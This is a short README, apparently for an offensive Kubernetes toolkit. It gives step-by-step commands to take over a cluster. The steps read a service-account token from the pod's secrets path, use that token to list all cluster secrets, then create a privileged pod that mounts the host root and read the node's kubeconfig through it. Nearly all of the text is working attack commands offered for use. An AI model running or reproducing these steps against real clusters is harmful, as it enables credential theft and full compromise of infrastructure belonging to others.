### README

1. **Get excessive privileges ServiceAccount token:**

```bash
# If you're in the pod
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# If you are on the node
kubectl describe secret <serviceaccount-token> # Replace <serviceaccount-token> with the Token name of the ServiceAccount with excessive privileges
```

2. **Example of combining `list secret`s and `create pods` permissions to take over the cluster**

*Note: You need to add the information you want to use in the go code such as token and host first*

```bash
# Get the entire cluster secrets and get a token with create pods privileges.
go run listSecret.go
# Use this token to create a privileged container that mounts the root directory and sets taint tolerance to exclude it from the master node, leaking the kubeconfig configuration file
go run createPod.go
# Access to this privileged container
kubectl exec -it nginx-pod-mount2 -n default -- bash
# View leaked kubeconfig file
cat /host/home/ubunt/.kube/config
```

